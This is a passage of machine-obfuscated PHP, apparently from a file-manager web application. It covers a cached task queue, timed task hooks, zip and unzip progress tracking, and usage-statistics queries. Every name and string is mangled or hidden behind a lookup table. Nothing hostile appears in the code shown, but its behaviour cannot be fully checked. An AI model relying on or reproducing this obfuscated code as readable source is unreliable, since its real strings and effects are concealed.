!1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($¿éÙçÕ¢ && array_find_by_field(self::$listData, $Å¬œÑ¿Ù[94], $¿éÙçÕ¢)) { return !0; } self::$listData[] = array($Å¬œÑ¿Ù[264] => $‹” êÇá, $Å¬œÑ¿Ù[1766] => $ºÍ’¶¹, $Å¬œÑ¿Ù[453] => $ÁÍœ—¬, $Å¬œÑ¿Ù[94] => $¿éÙçÕ¢); return !0; } public static function addSubmit() { $çååßÈ =& $_SERVER[ùÆÎÔ“Ñ]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($çååßÈ[1767] . json_encode_force(array_to_keyvalue(self::$listData, $çååßÈ[12], $çååßÈ[453])), $çååßÈ[1768]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($›¯“¬å, $äá®¶³½ = array(), $¤ÕÉöò“ = '', $òÜÈÁ = '') { $‡ÂäüŞÛ =& $_SERVER[ùÆÎÔ“Ñ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Çìâáùˆ = self::getAll(); if ($òÜÈÁ && array_find_by_field($Çìâáùˆ, $‡ÂäüŞÛ[94], $òÜÈÁ)) { return !0; } $Çìâáùˆ[] = array($‡ÂäüŞÛ[264] => $›¯“¬å, $‡ÂäüŞÛ[1766] => $äá®¶³½, $‡ÂäüŞÛ[453] => $¤ÕÉöò“, $‡ÂäüŞÛ[94] => $òÜÈÁ); write_log($‡ÂäüŞÛ[1767] . $¤ÕÉöò“, $‡ÂäüŞÛ[1768]); self::setAll($Çìâáùˆ); return !0; } public static function run() { $¥ûÁ‚ò» =& $_SERVER[ùÆÎÔ“Ñ]; $òòÓ½Š¿ = self::getAll(); $çÒ÷Î…† = array_shift($òòÓ½Š¿); if (!$çÒ÷Î…†) { return !1; } self::setAll($òòÓ½Š¿); $Û²ãˆıä = timeFloat(); try { Hook::apply($çÒ÷Î…†[$¥ûÁ‚ò»[264]], $çÒ÷Î…†[$¥ûÁ‚ò»[1766]]); } catch (Exception $¤Âü¦ıÍ) { } $¹¸Îş¸­ = number_format(timeFloat() - $Û²ãˆıä, 3) . $¥ûÁ‚ò»[1684]; write_log($¥ûÁ‚ò»[1769] . $çÒ÷Î…†[$¥ûÁ‚ò»[453]] . $¥ûÁ‚ò»[1770] . $¹¸Îş¸­, $¥ûÁ‚ò»[1768]); return !0; } public static function count() { $‹‹ñ±  = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$‹‹ñ± ) { return 0; } return intval($‹‹ñ± ); } public static function getAll() { $«ÔÔÓ¤Ç = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$«ÔÔÓ¤Ç) { return array(); } return $«ÔÔÓ¤Ç; } public static function setAll($î×—ª¬¾) { $€¶“ÎÔ¨ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($î×—ª¬¾), $€¶“ÎÔ¨); Cache::set(self::QUEUE_DATA, $î×—ª¬¾, $€¶“ÎÔ¨); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($‰«ŒÆ, $èªªá™ = 5.0) { if (!$‰«ŒÆ) { return; } $ˆ†ÅóŞ‘ = Cache::get($‰«ŒÆ); if (!$ˆ†ÅóŞ‘ || timeFloat() - floatVal($ˆ†ÅóŞ‘) >= $èªªá™) { Cache::set($‰«ŒÆ, timeFloat(), $èªªá™ * 10); return !0; } return !1; } public static function timeLimitCall($Ñïù¿å, $ò’ªÇæ, $ß‡¾¦, $²‹´‹äÒ = 5.0) { $ öÍªÃš =& $_SERVER[ùÆÎÔ“Ñ]; if (!$Ñïù¿å || !$ò’ªÇæ) { return; } self::$asyncAdd = !0; $İŒ¿Œıö = $ öÍªÃš[1771]; $ƒè Û¸† = Cache::get($İŒ¿Œıö, !0); $Æá‹É×„ = array($ öÍªÃš[1772] => timeFloat(), $ öÍªÃš[1773] => timeFloat(), $ öÍªÃš[264] => $ò’ªÇæ, $ öÍªÃš[1766] => $ß‡¾¦, $ öÍªÃš[203] => $²‹´‹äÒ); if (is_array($ƒè Û¸†[$Ñïù¿å])) { $Æá‹É×„[$ öÍªÃš[1773]] = $ƒè Û¸†[$Ñïù¿å][$ öÍªÃš[1773]]; } if (is_array($ƒè Û¸†[$Ñïù¿å])) { if (timeFloat() - $ƒè Û¸†[$Ñïù¿å][$ öÍªÃš[1772]] < $Æá‹É×„[$ öÍªÃš[203]] * 0.3) { return; } $Æá‹É×„[$ öÍªÃš[1773]] = $ƒè Û¸†[$Ñïù¿å][$ öÍªÃš[1773]]; } $ƒè Û¸†[$Ñïù¿å] = $Æá‹É×„; Cache::set($İŒ¿Œıö, $ƒè Û¸†, 60); Cache::removeMemory($İŒ¿Œıö); write_log($ öÍªÃš[1774] . $Ñïù¿å . $ öÍªÃš[71] . $ò’ªÇæ, $ öÍªÃš[1768]); } public static function timeLimitCallLoop() { $âŸÛİİ =& $_SERVER[ùÆÎÔ“Ñ]; $²±Æœ¤Í = array($âŸÛİİ[1775]); $çø„Í»Î = in_array(strtolower(ACTION), $²±Æœ¤Í); if (!$çø„Í»Î && !self::$asyncAdd) { return; } $¤ßØ›©Œ = $âŸÛİİ[1771]; $Ÿ¿û”ˆ = Cache::get($¤ßØ›©Œ, !0); if (!$Ÿ¿û”ˆ || count($Ÿ¿û”ˆ) <= 0) { return; } $¡Ïüş³ = !1; $÷‚‰Õ­ê = timeFloat(); $Á¢†õ = array(); foreach ($Ÿ¿û”ˆ as $Ûª«Ø¤© => $Èö¢¹’¬) { if ($÷‚‰Õ­ê - $Èö¢¹’¬[$âŸÛİİ[1773]] > $Èö¢¹’¬[$âŸÛİİ[203]]) { $¡Ïüş³ = !0; try { Hook::apply($Èö¢¹’¬[$âŸÛİİ[264]], $Èö¢¹’¬[$âŸÛİİ[1766]]); write_log($âŸÛİİ[1776] . $Ûª«Ø¤© . $âŸÛİİ[71] . $Èö¢¹’¬[$âŸÛİİ[264]] . $âŸÛİİ[1777] . ACTION, $âŸÛİİ[1768]); } catch (Exception $§„‚„‡ª) { } continue; } $Á¢†õ[$Ûª«Ø¤©] = $Èö¢¹’¬; } if (!$¡Ïüş³) { return; } if (!$Á¢†õ) { return Cache::remove($¤ßØ›©Œ); } Cache::set($¤ßØ›©Œ, $Á¢†õ, 60); Cache::removeMemory($¤ßØ›©Œ); } public static function finished($Ô÷ˆâéÏ, $Ù¨úöÎò) { $ø” ĞÆæ =& $_SERVER[ùÆÎÔ“Ñ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ø” ĞÆæ[264] => $Ô÷ˆâéÏ, $ø” ĞÆæ[1766] => $Ù¨úöÎò); } private static function finishedRun() { $ĞÖÄú’Ò =& $_SERVER[ùÆÎÔ“Ñ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $È‚ÀÃªÎ) { try { Hook::apply($È‚ÀÃªÎ[$ĞÖÄú’Ò[264]], $È‚ÀÃªÎ[$ĞÖÄú’Ò[1766]]); } catch (Exception $ÂÒæÛò½) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto bï­ Èó¥©; bï­ Èó¥©: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $İÉ³îå =& $_SERVER[ùÆÎÔ“Ñ]; parent::startAfter(); Hook::bind($İÉ³îå[1778], array($this, $İÉ³îå[1779])); Hook::bind($İÉ³îå[1199], array($this, $İÉ³îå[1780])); $ò”™˜‹Ş =& $this->task; $ò”™˜‹Ş[$İÉ³îå[1781]] = $İÉ³îå[1200]; if (!$ò”™˜‹Ş[$İÉ³îå[1567]]) { $ò”™˜‹Ş[$İÉ³îå[1567]] = LNG($İÉ³îå[1782]); } } protected function endAfter() { $ÉöŠí”¿ =& $_SERVER[ùÆÎÔ“Ñ]; parent::endAfter(); Hook::unbind($ÉöŠí”¿[1778], array($this, $ÉöŠí”¿[1779])); Hook::unbind($ÉöŠí”¿[1199], array($this, $ÉöŠí”¿[1780])); } public function updateAfter() { $İšÕ»â½ =& $_SERVER[ùÆÎÔ“Ñ]; $ù­Ş¹´ =& $this->task; if (!$ù­Ş¹´[$İšÕ»â½[787]] || !$ù­Ş¹´[$İšÕ»â½[764]]) { return; } if ($ù­Ş¹´[$İšÕ»â½[1781]] == $İšÕ»â½[1200]) { $€°á‹šä = 0; if ($ù­Ş¹´[$İšÕ»â½[1721]]) { $€°á‹šä = $ù­Ş¹´[$İšÕ»â½[1722]] / $ù­Ş¹´[$İšÕ»â½[1721]]; } $ù­Ş¹´[$İšÕ»â½[1669]] = $€°á‹šä * 0.3; } else { if ($ù­Ş¹´[$İšÕ»â½[1781]] == $İšÕ»â½[313]) { $€°á‹šä = $ù­Ş¹´[$İšÕ»â½[1668]] / $ù­Ş¹´[$İšÕ»â½[787]]; $ù­Ş¹´[$İšÕ»â½[1669]] = 0.3 + $€°á‹šä * 0.4; } else { if ($ù­Ş¹´[$İšÕ»â½[1781]] == $İšÕ»â½[107]) { $Ÿ·íÄÆ‘ = 0; if ($ù­Ş¹´[$İšÕ»â½[1723]] == $İšÕ»â½[107]) { $Ÿ·íÄÆ‘ = $ù­Ş¹´[$İšÕ»â½[1722]]; } $€°á‹šä = ($ù­Ş¹´[$İšÕ»â½[1726]] + $Ÿ·íÄÆ‘) / $ù­Ş¹´[$İšÕ»â½[764]]; $ù­Ş¹´[$İšÕ»â½[1669]] = 0.3 + 0.4 + $€°á‹šä * 0.3; } } } if ($ù­Ş¹´[$İšÕ»â½[1669]] > 0) { $·¼Ü•Ëß = timeFloat() - $ù­Ş¹´[$İšÕ»â½[1671]] - $ù­Ş¹´[$İšÕ»â½[1674]]; $ù­Ş¹´[$İšÕ»â½[1675]] = $·¼Ü•Ëß * (1 - $ù­Ş¹´[$İšÕ»â½[1669]]) / $ù­Ş¹´[$İšÕ»â½[1669]]; } } public function addFile($…¸ëíÛ) { $€—Ò™—Ï =& $_SERVER[ùÆÎÔ“Ñ]; $àçñİÃ€ =& $this->task; $ÃÅ×ïÁ– = IO::info($…¸ëíÛ); $àçñİÃ€[$€—Ò™—Ï[1719]] = $ÃÅ×ïÁ–[$€—Ò™—Ï[32]]; $àçñİÃ€[$€—Ò™—Ï[1721]] = $ÃÅ×ïÁ–[$€—Ò™—Ï[76]]; $àçñİÃ€[$€—Ò™—Ï[1722]] = 0; $àçñİÃ€[$€—Ò™—Ï[1069]] = $€—Ò™—Ï[1742]; $àçñİÃ€[$€—Ò™—Ï[1723]] = $€—Ò™—Ï[1200]; $àçñİÃ€[$€—Ò™—Ï[764]] = $ÃÅ×ïÁ–[$€—Ò™—Ï[76]]; $àçñİÃ€[$€—Ò™—Ï[787]] = 1; $·Šİ„¿ = 0; $àçñİÃ€[$€—Ò™—Ï[1730]] = array($€—Ò™—Ï[1731] => $·Šİ„¿ + 1, $€—Ò™—Ï[420] => $ÃÅ×ïÁ–[$€—Ò™—Ï[32]], $€—Ò™—Ï[84] => $ÃÅ×ïÁ–[$€—Ò™—Ï[84]], $€—Ò™—Ï[519] => $ÃÅ×ïÁ–[$€—Ò™—Ï[519]] ? $ÃÅ×ïÁ–[$€—Ò™—Ï[519]] : $ÃÅ×ïÁ–[$€—Ò™—Ï[84]]); $this->update(); } public function unzipAfter($Åø•ùö«) { $¾û·Üî =& $_SERVER[ùÆÎÔ“Ñ]; $ıÂâÀ›… =& $this->task; $ıÂâÀ›…[$¾û·Üî[1781]] = $¾û·Üî[107]; $¦¤û˜ö± = IO::infoWithChildren($Åø•ùö«); $ë™şãœÃ = 0; $ıÂâÀ›…[$¾û·Üî[1730]] = array($¾û·Üî[1731] => $ë™şãœÃ + 1, $¾û·Üî[420] => $¦¤û˜ö±[$¾û·Üî[32]], $¾û·Üî[84] => $¦¤û˜ö±[$¾û·Üî[84]], $¾û·Üî[519] => $¦¤û˜ö±[$¾û·Üî[519]] ? $¦¤û˜ö±[$¾û·Üî[519]] : $¦¤û˜ö±[$¾û·Üî[84]]); if ($¦¤û˜ö±[$¾û·Üî[33]] == $¾û·Üî[199]) { $ıÂâÀ›…[$¾û·Üî[787]] = 1; } else { $ıÂâÀ›…[$¾û·Üî[787]] = $¦¤û˜ö±[$¾û·Üî[79]][$¾û·Üî[77]]; } $ıÂâÀ›…[$¾û·Üî[1069]] = $¾û·Üî[12]; $ıÂâÀ›…[$¾û·Üî[1723]] = 0; $ıÂâÀ›…[$¾û·Üî[1668]] = 0; $ıÂâÀ›…[$¾û·Üî[1721]] = 0; $ıÂâÀ›…[$¾û·Üî[1722]] = 0; $ıÂâÀ›…[$¾û·Üî[1719]] = $¾û·Üî[12]; $ıÂâÀ›…[$¾û·Üî[1726]] = 0; $ıÂâÀ›…[$¾û·Üî[764]] = $¦¤û˜ö±[$¾û·Üî[76]]; $this->update(); self::log($¾û·Üî[1783] . json_encode(array($ıÂâÀ›…, $¦¤û˜ö±))); } public function nameParse($ÑÙ¥àŒ´) { $ÙÒª¤”ï =& $_SERVER[ùÆÎÔ“Ñ]; $®ÒûóŒ =& $this->task; if ($®ÒûóŒ[$ÙÒª¤”ï[1781]] == $ÙÒª¤”ï[1200]) { $®ÒûóŒ[$ÙÒª¤”ï[1781]] = $ÙÒª¤”ï[313]; $®ÒûóŒ[$ÙÒª¤”ï[1726]] = 0; $®ÒûóŒ[$ÙÒª¤”ï[764]] = 0; } $ÁŒèÓÁ  = get_path_this($ÑÙ¥àŒ´); if (strstr($ÁŒèÓÁ , $ÙÒª¤”ï[10])) { $®ÒûóŒ[$ÙÒª¤”ï[1668]] += 1; $®ÒûóŒ[$ÙÒª¤”ï[787]] += 1; } $®ÒûóŒ[$ÙÒª¤”ï[1719]] = $ÑÙ¥àŒ´; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $˜£Şä© =& $_SERVER[ùÆÎÔ“Ñ]; parent::startAfter(); Hook::bind($˜£Şä©[1784], array($this, $˜£Şä©[1779])); $Êï­İ‚ƒ =& $this->task; $Êï­İ‚ƒ[$˜£Şä©[1781]] = $˜£Şä©[1200]; if (!$Êï­İ‚ƒ[$˜£Şä©[1567]]) { $Êï­İ‚ƒ[$˜£Şä©[1567]] = LNG($˜£Şä©[1785]); } } protected function endAfter() { $ã™ê¢Ìô =& $_SERVER[ùÆÎÔ“Ñ]; parent::endAfter(); Hook::unbind($ã™ê¢Ìô[1784], array($this, $ã™ê¢Ìô[1779])); } public function updateAfter() { $“è£îÈ =& $_SERVER[ùÆÎÔ“Ñ]; $’Ğã =& $this->task; if (!$’Ğã[$“è£îÈ[787]] || !$’Ğã[$“è£îÈ[764]]) { return; } if ($’Ğã[$“è£îÈ[1781]] == $“è£îÈ[1200]) { $³£›ªö = $’Ğã[$“è£îÈ[1722]]; if ($’Ğã[$“è£îÈ[1723]] != $“è£îÈ[1200]) { $³£›ªö = 0; } $„ëÊ¾Š = ($’Ğã[$“è£îÈ[1726]] + $³£›ªö) / $’Ğã[$“è£îÈ[764]]; $’Ğã[$“è£îÈ[1669]] = $„ëÊ¾Š * 0.3; } else { if ($’Ğã[$“è£îÈ[1781]] == $“è£îÈ[313]) { $„ëÊ¾Š = $’Ğã[$“è£îÈ[1668]] / $’Ğã[$“è£îÈ[787]]; $’Ğã[$“è£îÈ[1669]] = 0.3 + $„ëÊ¾Š * 0.5; } else { if ($’Ğã[$“è£îÈ[1781]] == $“è£îÈ[107]) { $„ëÊ¾Š = 0; if ($’Ğã[$“è£îÈ[1721]]) { $„ëÊ¾Š = $’Ğã[$“è£îÈ[1722]] / $’Ğã[$“è£îÈ[1721]]; } $’Ğã[$“è£îÈ[1669]] = 0.3 + 0.5 + $„ëÊ¾Š * 0.2; } } } if ($’Ğã[$“è£îÈ[1669]] > 0) { $ı‹Ğ½Õ¯ = timeFloat() - $’Ğã[$“è£îÈ[1671]] - $’Ğã[$“è£îÈ[1674]]; $’Ğã[$“è£îÈ[1675]] = $ı‹Ğ½Õ¯ * (1 - $’Ğã[$“è£îÈ[1669]]) / $’Ğã[$“è£îÈ[1669]]; } } public function copyFileStart($àË£ ·, $«ÄÈı², $Íî¬ª¼, $ïøµ¢”Ñ, $‡¡˜ó©ä, $¶ŸÉêÌ”) { $Ø¾İé†â =& $_SERVER[ùÆÎÔ“Ñ]; parent::copyFileStart($àË£ ·, $«ÄÈı², $Íî¬ª¼, $ïøµ¢”Ñ, $‡¡˜ó©ä, $¶ŸÉêÌ”); $¹€¯ç±ˆ =& $this->task; if ($¹€¯ç±ˆ[$Ø¾İé†â[1781]] == $Ø¾İé†â[313]) { $¹€¯ç±ˆ[$Ø¾İé†â[1781]] = $Ø¾İé†â[107]; } $this->update(); } public function copyFileEnd($é”ìùÛ“, $š½óŸ×Ò, $·…´çßŸ, $ãÏ¶×º£, $«÷¥¢Ãä, $Ì½±™ö) { $Û–…Œ‚ş =& $_SERVER[ùÆÎÔ“Ñ]; $§êÒ“…Û =& $this->task; $§êÒ“…Û[$Û–…Œ‚ş[1722]] = $§êÒ“…Û[$Û–…Œ‚ş[1721]]; $§êÒ“…Û[$Û–…Œ‚ş[1726]] += $§êÒ“…Û[$Û–…Œ‚ş[1721]]; $§êÒ“…Û[$Û–…Œ‚ş[1723]] = $Û–…Œ‚ş[12]; $this->update(); } public function nameParse($«ëô¼ëø) { $ª¤‡”ß† =& $_SERVER[ùÆÎÔ“Ñ]; $âæâÕµ¬ =& $this->task; if ($âæâÕµ¬[$ª¤‡”ß†[1668]] < $âæâÕµ¬[$ª¤‡”ß†[787]]) { $Ü·ÇÂ¥¸ = get_path_this($«ëô¼ëø); if (strstr($Ü·ÇÂ¥¸, $ª¤‡”ß†[10])) { $âæâÕµ¬[$ª¤‡”ß†[1668]] += 1; } } if ($âæâÕµ¬[$ª¤‡”ß†[1781]] == $ª¤‡”ß†[1200]) { $âæâÕµ¬[$ª¤‡”ß†[1781]] = $ª¤‡”ß†[313]; } $âæâÕµ¬[$ª¤‡”ß†[1719]] = $«ëô¼ëø; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($Éóæâı¦) { $Î¢ÜÌÁæ =& $_SERVER[ùÆÎÔ“Ñ]; $çÙÜ¨ûô = array($Î¢ÜÌÁæ[600] => array($Î¢ÜÌÁæ[33] => $Î¢ÜÌÁæ[1786], $Î¢ÜÌÁæ[273] => array($Î¢ÜÌÁæ[224], $Î¢ÜÌÁæ[766], $Î¢ÜÌÁæ[1787], $Î¢ÜÌÁæ[1788])), $Î¢ÜÌÁæ[1789] => array($Î¢ÜÌÁæ[33] => $Î¢ÜÌÁæ[1790], $Î¢ÜÌÁæ[273] => array($Î¢ÜÌÁæ[224], $Î¢ÜÌÁæ[764], $Î¢ÜÌÁæ[1791], $Î¢ÜÌÁæ[1792], $Î¢ÜÌÁæ[1793]))); if (!isset($çÙÜ¨ûô[$Éóæâı¦])) { return !1; } $this->optionType = $çÙÜ¨ûô[$Éóæâı¦][$Î¢ÜÌÁæ[33]]; $this->field = $çÙÜ¨ûô[$Éóæâı¦][$Î¢ÜÌÁæ[273]]; return !0; } public function listData($í¯¸‡ŸÆ = false, $çÂ­şò” = "\155\157\144\x69\146\x79\x54\x69\x6d\x65", $‰…İÚË = false) { return parent::listData($í¯¸‡ŸÆ, $çÂ­şò”, $‰…İÚË); } public function trendList($ä¥¸¤õÊ) { $íÂøÇ¸Á =& $_SERVER[ùÆÎÔ“Ñ]; $Æ¶›Ğë¿ = $this->listData(); if ($Æ¶›Ğë¿) { $Ğ¿¹†ãÑ = end($Æ¶›Ğë¿); $Ã¡û…ı„ = date($íÂøÇ¸Á[1794], strtotime($íÂøÇ¸Á[1795])); if ($Ğ¿¹†ãÑ[$íÂøÇ¸Á[224]] == $Ã¡û…ı„) { return $Æ¶›Ğë¿; } $×¼£äèñ = strtotime($Ğ¿¹†ãÑ[$íÂøÇ¸Á[224]]); } if (!isset($×¼£äèñ)) { $åßŸ´ÖÚ = $ä¥¸¤õÊ == $íÂøÇ¸Á[600] ? $íÂøÇ¸Á[535] : $íÂøÇ¸Á[826]; $×¼£äèñ = Model($åßŸ´ÖÚ)->min($íÂøÇ¸Á[200]); } $¤ú–”†… = $íÂøÇ¸Á[1796] . ucfirst($ä¥¸¤õÊ); $àˆ“şò = $this->dateList($×¼£äèñ); foreach ($àˆ“şò as $Ã¡û…ı„) { $this->{$¤ú–”†…}($Ã¡û…ı„); } return $this->listData(); } private function dateList($ì±ûƒº) { $ÜúÍ–ƒ¯ =& $_SERVER[ùÆÎÔ“Ñ]; $Ç‡°óô° = $ì±ûƒº; $§Šª˜Ê = strtotime($ÜúÍ–ƒ¯[1795]); $õ¦èÌ­œ = array(); while ($Ç‡°óô° <= $§Šª˜Ê) { $õ¦èÌ­œ[] = date($ÜúÍ–ƒ¯[1794], $Ç‡°óô°); $Ç‡°óô° = strtotime($ÜúÍ–ƒ¯[1797], $Ç‡°óô°); } return $õ¦èÌ­œ; } public function _recordUser($â×™©®¢ = '') { $»Î˜˜û =& $_SERVER[ùÆÎÔ“Ñ]; $¦Ğ„´³Ò = strtotime(date($»Î˜˜û[1798], strtotime($â×™©®¢))); $òåëØÊ­ = strtotime(date($»Î˜˜û[1799], strtotime($â×™©®¢))); $ëôè…ß« = array($»Î˜˜û[200] => array($»Î˜˜û[1018], $òåëØÊ­)); $Ôéğğ®Ó = Model($»Î˜˜û[535])->where($ëôè…ß«)->count($»Î˜˜û[1667]); $ëôè…ß«[$»Î˜˜û[200]] = array($»Î˜˜û[333], array($¦Ğ„´³Ò, $òåëØÊ­)); $çÙ”›€Ô = Model($»Î˜˜û[535])->where($ëôè…ß«)->count($»Î˜˜û[1667]); $ëôè…ß«[$»Î˜˜û[33]] = $»Î˜˜û[1800]; $¥£ÄëÃ‚ = Model($»Î˜˜û[1801])->where($ëôè…ß«)->count($»Î˜˜û[1802]); $áÄÃ°ıí = array($»Î˜˜û[224] => $â×™©®¢, $»Î˜˜û[766] => (int) $Ôéğğ®Ó, $»Î˜˜û[1787] => (int) $çÙ”›€Ô, $»Î˜˜û[1788] => (int) $¥£ÄëÃ‚); return $this->insert($áÄÃ°ıí); } public function _recordStore($ò×’·ƒ = '') { $ì¶Ğ×ƒå =& $_SERVER[ùÆÎÔ“Ñ]; $œï™ï = strtotime(date($ì¶Ğ×ƒå[1799], strtotime($ò×’·ƒ))); $òı•¬¶ø = array($ì¶Ğ×ƒå[200] => array($ì¶Ğ×ƒå[1018], $œï™ï)); $ÛáûÇ­› = Model($ì¶Ğ×ƒå[471])->where($òı•¬¶ø)->sum($ì¶Ğ×ƒå[76]); $òı•¬¶ø[$ì¶Ğ×ƒå[410]] = 0; $™Œ•°ÆÂ = Model($ì¶Ğ×ƒå[826])->where($òı•¬¶ø)->sum($ì¶Ğ×ƒå[76]); $òı•¬¶ø[$ì¶Ğ×ƒå[411]] = 1; $¥¶ù = Model($ì¶Ğ×ƒå[826])->where($òı•¬¶ø)->sum($ì¶Ğ×ƒå[76]); $òı•¬¶ø[$ì¶Ğ×ƒå[411]] = 2; $áÛŒÎê = Model($ì¶Ğ×ƒå[826])->where($òı•¬¶ø)->sum($ì¶Ğ×ƒå[76]); $¡—«°È¬ = array($ì¶Ğ×ƒå[224] => $ò×’·ƒ, $ì¶Ğ×ƒå[764] => (int) $™Œ•°ÆÂ, $ì¶Ğ×ƒå[1791] => (int) $ÛáûÇ­›, $ì¶Ğ×ƒå[1792] => (int) $¥¶ù, $ì¶Ğ×ƒå[1793] => (int) $áÛŒÎê); return $this->insert($¡—«°È¬); } public function trend($–Óß÷ÛÜ, $€‘¬š¢) { $û—ëÔ«ú =& $_SERVER[ùÆÎÔ“Ñ]; if (!$this->init($–Óß÷ÛÜ)) { return !1; } $†÷±úÊ† = $this->trendList($–Óß÷ÛÜ); if ($†÷±úÊ† && $€‘¬š¢ != $û—ëÔ«ú[1640]) { $ğ¼à‹ÅÆ = $†÷±úÊ†[0][$û—ëÔ«ú[224]]; $¤¤»Õ¼” = $this->validDate($€‘¬š¢, $ğ¼à‹ÅÆ); $î»Şã‹Å = array(); $Ğ®Í©¨÷ = array_to_keyvalue($†÷±úÊ†, $û—ëÔ«ú[224]); foreach ($¤¤»Õ¼” as $Šßòè‘) { if (isset($Ğ®Í©¨÷[$Šßòè‘])) { $ÊúÁãø® = $Ğ®Í©¨÷[$Šßòè‘]; } else { $ÊúÁãø® = end($†÷±úÊ†); $ÊúÁãø®[$û—ëÔ«ú[224]] = $Šßòè‘; if ($–Óß÷ÛÜ == $û—ëÔ«ú[600]) { $ÊúÁãø®[$û—ëÔ«ú[1787]] = $ÊúÁãø®[$û—ëÔ«ú[1788]] = 0; } } $î»Şã‹Å[] = $ÊúÁãø®; } $†÷±úÊ† = $î»Şã‹Å; } $¾îÆ‡Æì = array($û—ëÔ«ú[600] => array($û—ëÔ«ú[766] => LNG($û—ëÔ«ú[1803]), $û—ëÔ«ú[1787] => LNG($û—ëÔ«ú[1804]), $û—ëÔ«ú[1788] => LNG($û—ëÔ«ú[1805])), $û—ëÔ«ú[1789] => array($û—ëÔ«ú[764] => LNG($û—ëÔ«ú[1806]), $û—ëÔ«ú[1791] => LNG($û—ëÔ«ú[1807]), $û—ëÔ«ú[1792] => LNG($û—ëÔ«ú[1808]), $û—ëÔ«ú[1793] => LNG($û—ëÔ«ú[1809]))); $ñ¡ŠÕí = array($û—ëÔ«ú[600] => $û—ëÔ«ú[1810], $û—ëÔ«ú[1789] => $û—ëÔ«ú[76]); if (empty($†÷±úÊ†)) { $Šßòè‘ = date($û—ëÔ«ú[1794], strtotime($û—ëÔ«ú[1795])); $Ç®„øª¹ = array($û—ëÔ«ú[224] => $Šßòè‘); foreach ($¾îÆ‡Æì[$–Óß÷ÛÜ] as $áú™¹¶Í => $õâç™Íú) { $Ç®„øª¹[$áú™¹¶Í] = 0; } $†÷±úÊ†[] = $Ç®„øª¹; } $ãªéÑîö = array(); foreach ($†÷±úÊ† as $õâç™Íú) { if ($–Óß÷ÛÜ == $û—ëÔ«ú[1789] && $õâç™Íú[$û—ëÔ«ú[1791]] > $õâç™Íú[$û—ëÔ«ú[764]]) { $õâç™Íú[$û—ëÔ«ú[1791]] = $õâç™Íú[$û—ëÔ«ú[764]]; } foreach ($¾îÆ‡Æì[$–Óß÷ÛÜ] as $áú™¹¶Í => $î»±éÇ•) { $ÊúÁãø® = array($û—ëÔ«ú[224] => $õâç™Íú[$û—ëÔ«ú[224]], $û—ëÔ«ú[1567] => $î»±éÇ•); $ÊúÁãø®[$ñ¡ŠÕí[$–Óß÷ÛÜ]] = isset($õâç™Íú[$áú™¹¶Í]) ? $õâç™Íú[$áú™¹¶Í] : 0; $ãªéÑîö[] = $ÊúÁãø®; } } return $ãªéÑîö; } public function validDate($µšÄ–¢ì, $ö¡ëò†«) { $º×í©ş =& $_SERVER[ùÆÎÔ“Ñ]; $¿úâßº = date($º×í©ş[1794], strtotime($º×í©ş[1795])); $å™‡¯¼ë = array($¿úâßº); switch ($µšÄ–¢ì) { case $º×í©ş[1647]: $‡›åúå§ = mktime(0, 0, 0, date($º×í©ş[1811]), date($º×í©ş[1389]) - date($º×í©ş[1452]) + 7 - 7, date($º×í©ş[1812])); $İÙË¹Áû = 0; do { $Ã´¶Øûô = date($º×í©ş[1794], $‡›åúå§ - 3600 * 24 * 7 * $İÙË¹Áû); $å™‡¯¼ë[] = $Ã´¶Øûô; $İÙË¹Áû++; } while ($ö¡ëò†« < $Ã´¶Øûô); break; case $º×í©ş[1645]: $İÙË¹Áû = 1; do { $ÃçŒ°¸ö = date($º×í©ş[1813], strtotime("\55\x20{$İÙË¹Áû}\x20\155\x6f\x6e\164\x68\x73")); $å™‡¯¼ë[] = $ÃçŒ°¸ö; $İÙË¹Áû++; } while ($ö¡ëò†« < $ÃçŒ°¸ö); break; case $º×í©ş[1814]: $×¬ç¼£Ø = (int) date($º×í©ş[1812], strtotime($ö¡ëò†«)); $çïî‹àø = (int) date($º×í©ş[1812]); if ($×¬ç¼£Ø >= $çïî‹àø) { break; } for ($×¬ç¼£Ø; $×¬ç¼£Ø < $çïî‹àø; $×¬ç¼£Ø++) { $å™‡¯¼ë[] = $×¬ç¼£Ø . $º×í©ş[1815]; } break; default: break; } if ($ö¡ëò†« > end($å™‡¯¼ë)) { array_pop($å™‡¯¼ë); } sort($å™‡¯¼ë); return $å™‡¯¼ë; } public function listTable($Úú¬ïÓá) { $ĞåÔü‚ = ucfirst($Úú¬ïÓá); return Model($ĞåÔü‚)->listData(); } public function option($«Ã±Ó¥â) { $—ÊÀ„À = $_SERVER[ùÆÎÔ“Ñ][1816] . ucfirst($«Ã±Ó¥â); return $this->{$—ÊÀ„À}(); } private function optionUser() { $¬ÚœÀ»± =& $_SERVER[ùÆÎÔ“Ñ]; $ìçÕ“±î = Model($¬ÚœÀ»±[535])->count($¬ÚœÀ»±[1667]); $›ÏÅ¸“š = Model($¬ÚœÀ»±[535])->where($¬ÚœÀ»±[1817])->count($¬ÚœÀ»±[1667]); $‚ÕéÎŒ = intval($GLOBALS[$¬ÚœÀ»±[6]][$¬ÚœÀ»±[349]][$¬ÚœÀ»±[1622]]) / 3600; $Ú¿Œîİï = strtotime("\55{$‚ÕéÎŒ}\40\x68\x6f\165\x72\163"); $êˆ»¦ë‘ = strtotime(date($¬ÚœÀ»±[1798])); if ($Ú¿Œîİï < $êˆ»¦ë‘) { $Ú¿Œîİï = $êˆ»¦ë‘; } $‰·É¥¸Ö = array($¬ÚœÀ»±[1818] => array($¬ÚœÀ»±[1019], $Ú¿Œîİï)); $áÑ¯¸­ = (int) 